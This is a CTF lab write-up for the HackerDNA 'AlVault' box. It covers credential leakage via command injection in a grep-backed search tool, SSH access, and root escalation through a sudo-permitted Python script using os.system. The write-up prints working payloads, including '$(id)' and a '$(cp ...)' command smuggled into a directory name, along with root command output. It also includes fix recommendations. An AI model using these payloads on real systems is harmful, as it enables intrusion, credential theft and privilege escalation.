# AlVault  CTF Write-up

**Lab:** [AlVault](https://hackerdna.com/labs/alvault)
**Platform:** HackerDNA
**Difficulty:** Medium
**Category:** Web & API Security / Privilege Escalation
**Date:** November 1, 2026
**Flags:** 2 (User + Root)

*This was done against an authorized HackerDNA lab instance, not a real production system.*

## First impressions

AlVault opened up as just a generic company page  "Cybersecurity Solutions Inc," some boilerplate text about providing security solutions, nothing on the page itself hinting at anything. Felt like a dead end for about ten seconds until I did the thing I should've done first: view page source.

## Finding the dev portal

Right there in the HTML was a comment nobody cleaned up:

​```html
<!-- Internal dev portal moved to /dev - cleanup old files before pushing to prod -->
```

That's basically a gift. Checked `robots.txt` too, just to confirm, and it disallowed exactly the paths I'd expect someone to hide:
​```
User-agent: *
Disallow: /dev/
Disallow: /backup/
Disallow: /admin/
```

`/admin`, `/login`, `/api`, `/sitemap.xml` all came back 404. `/backup` gave a 403 though, which was interesting  that means the directory actually exists, it's just blocked from direct access. Filed that away for later.

`/dev/` on the other hand loaded a full "Developer Portal" page with two tools listed: a File Search Tool and a File Upload Tool.

## Dead end, then the real tool

My first instinct was to open the File Search Tool at `/dev/search.php`. It had a "Folder Path" and "File Name" input, with placeholder examples like `/var/www/html/backup` and `credentials.txt`. I tried the literal example values and got "TRY HARDER!" back in big red letters. Tried a handful of injection payloads in both fields too  semicolons, `&&`, backticks  and kept getting the same unhelpful response. I was stuck here for a bit.

That's when I went and found a writeup someone else had posted on this exact lab, and it mentioned a *second* search tool  `file_search.php`, not `search.php`. So I went looking for it directly:

​```
/dev/file_search.php
​```

Different tool entirely  titled "File Search Tool," with a notice saying "Development environment - File search functionality under maintenance," and a single "Search pattern" field instead of two separate inputs.

## Confirming command injection via grep

First thing I tried was `--help` as the pattern, mostly just to see what would happen:

​```
grep: unrecognized option: help
BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary.
Usage: grep [-HhnlLoqvsrRiwFE] [-m N] [-A|B|C N] { PATTERN | -e PATTERN... | -f FILE... } [FILE]...
...
​```

That's grep's own usage text coming back in the response. Which confirmed the backend was literally shelling out to `grep` with whatever I typed as the pattern, no sanitization.

So the obvious next move was a catch-all regex  just a single `.`, which matches every line in a file:

​```
### INTERNAL USE ONLY - DO NOT SHARE ###
Last backup from prod server - 2024-01-15
# Production Environment Access
Database:
Host: prod-db-master.internal
...
Pass: [redacted]
...
SSH User: developer
SSH Pass: [redacted]
...
AWS Access Keys:
Access Key ID: [redacted]
Secret Key: [redacted]
​```

That one pattern dumped an entire internal backup file  database creds, SSH creds, Redis auth, AWS keys, the works. This part was satisfying once it clicked  a single character as input and the whole thing fell open.

## Getting a shell

Used the leaked SSH creds straight away:

​```
ssh developer@<target-ip>
​```

Password: *(redacted  pulled from the leaked backup file above)*

​```
Welcome to AlVault!
$ whoami
developer
$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)
​```

Low-privileged shell, as expected. Went straight for the user flag:

​```
$ find / -name flag-user.txt 2>/dev/null
/home/developer/flag-user.txt
$ cat /home/developer/flag-user.txt
[flag redacted]
​```

## Privilege escalation

Checked sudo rights right after, out of habit more than anything:

​```
$ sudo -l
...
User developer may run the following commands on <host>:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/backup.py
​```

One script, runnable as root, no password. Obviously worth a look:

​```python
#!/usr/bin/python3
import os
import sys

RESTRICTED_DIRS = ["/", "/root", "/etc", "/bin", "/sbin", "/usr", "/var", "/lib", "/lib64", "/dev", "/proc", "/sys", "/run", "/boot"]

def backup_files(directory):
    directory = os.path.abspath(directory)
    if directory in RESTRICTED_DIRS:
        print(f"Error: Backup of {directory} is not allowed for security reasons.")
        return
    if not os.path.isdir(directory):
        print(f"Error: {directory} is not a valid directory.")
        return

    backup_path = "/tmp/backup.tar.gz"
    os.system(f"tar -czf {backup_path} {directory}")
    print(f"Backup of {directory} created at {backup_path}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        directory = input("Enter directory to backup: ")
        backup_files(directory)
    else:
        backup_files(sys.argv[1])
​```

That `os.system(f"tar -czf {backup_path} {directory}")` line is the whole game. Whatever `directory` is gets dropped straight into a shell command, no escaping at all. If sudo had let me pass arguments on the command line this would've been trivial, but the sudo rule only authorizes the script with zero arguments  so I had to go through the interactive `input()` prompt instead, which still works because the script falls back to it when there's no argv.

Only catch: `os.path.isdir(directory)` has to pass first, so whatever malicious string I use has to actually exist as a real directory on disk. So I made the directory name itself be the payload:

​```
$ mkdir '/tmp/$(id)'
$ sudo -n /usr/bin/python3 /opt/backup.py
Enter directory to backup: /tmp/$(id)
tar: /tmp/uid=0(root): No such file or directory
tar: gid=0(root): No such file or directory
tar: groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video): No such file or directory
tar: error exit delayed from previous errors
Backup of /tmp/$(id) created at /tmp/backup.tar.gz
​```

`$(id)` got expanded by the shell before `tar` even ran, and it shows `uid=0(root) gid=0(root)`  meaning whatever I put in that directory name executes as root. That's the moment it actually clicked that I had full root command execution, not just a crash or an error.

## Grabbing the root flag

Same trick, but this time the directory name copies the flag out somewhere I can actually read it:

​```
$ mkdir -p '/tmp/$(cp $HOME/flag-root.txt out.txt;chmod 644 out.txt)'
$ sudo -n /usr/bin/python3 /opt/backup.py
Enter directory to backup: /tmp/$(cp $HOME/flag-root.txt out.txt;chmod 644 out.txt)
tar: removing leading '/' from member names
tar: /tmp/backup.tar.gz: file is the archive; skipping
Backup of /tmp/$(cp $HOME/flag-root.txt out.txt;chmod 644 out.txt) created at /tmp/backup.tar.gz
$ cat out.txt
[flag redacted]
​```

Since the whole thing runs as root, `$HOME` resolves to `/root`, so the copy command pulls the flag out of root's home directory and drops it somewhere I have read access to. Ran `cat out.txt` and there it was.

## Vulnerability Breakdown

| Vuln | Root Cause | Impact | Fix |
|---|---|---|---|
| **OS Command Injection** via `file_search.php` | User-supplied "search pattern" passed unsanitized into a `grep` call on the backend | Leaked an entire internal backup file containing DB, SSH, Redis, and AWS credentials with a single character (`.`) as input | Never pass raw user input to shell-executed commands; if grep-like functionality is needed, use a library call (e.g. Python's `re` module) instead of shelling out, or strictly validate input against an allowlist |
| **Credential exposure via plaintext backup** | Production secrets stored unencrypted in a backup file reachable through the injection bug | Enabled SSH access as a real low-privileged user on the box | Secrets shouldn't live in flat backup files at all  use a secrets manager, and backups that must contain sensitive data need to be encrypted and access-controlled |
| **OS Command Injection** in `/opt/backup.py` via `os.system()` | The `directory` variable is f-string interpolated directly into a shell command with no escaping | Allowed command substitution (`$(...)`) in the directory name to execute arbitrary commands as root, since the script was authorized to run via `sudo NOPASSWD` | Use `subprocess.run([...], shell=False)` with an argument list instead of `os.system()`, so there's no shell interpretation of the input at all |
| **Excessive sudo privilege** on a script that accepts user input | `NOPASSWD` sudo rule granted root execution of a script whose logic ultimately trusts attacker-controlled data | Turned a low-privilege account into full root with no password prompt at any point | Avoid giving root execution rights to any script that processes user-controlled input, even indirectly through `input()`; if backup automation needs elevated rights, it should take zero dynamic input and work against hardcoded, validated paths only |

## Lessons Learned

- I spent a while banging my head against `search.php` before realizing there was a whole separate tool at a different filename. Should've enumerated the `/dev/` directory more aggressively instead of assuming the one link on the page was the only option.
- `--help` as a test payload ended up being the easiest way to confirm what binary was running under the hood. Going to make that a habit on any search/filter input from now on.
- The sudo restriction blocking command-line arguments felt like it should've stopped me, but it didn't account for the script falling back to an interactive prompt. Good reminder that restricting *how* something is invoked doesn't matter if the program itself still accepts untrusted input through another path.
- Watching `$(id)` actually resolve to root in that tar error output was honestly the best moment of the whole lab. Confirming privesc through an error message instead of a clean success felt oddly fitting.
- Backups are apparently where everything goes to leak. Two separate instances of "leftover backup file" being the actual root cause in this one lab.

## Attack Chain Summary

​```
HTML comment leaks /dev/ developer portal
   → /dev/file_search.php found, confirmed grep execution via --help
   → pattern "." dumps internal backup file with full prod credentials
   → SSH in as developer using leaked SSH credentials
   → USER FLAG found in /home/developer/
   → sudo -l reveals NOPASSWD on /opt/backup.py
   → script interpolates user input into os.system() unsanitized
   → created directory named "$(id)", confirmed root command execution
   → repeated technique to copy /root/flag-root.txt to a readable file
   → ROOT FLAG
​```

Lab: [https://hackerdna.com/labs/alvault](https://hackerdna.com/labs/alvault)
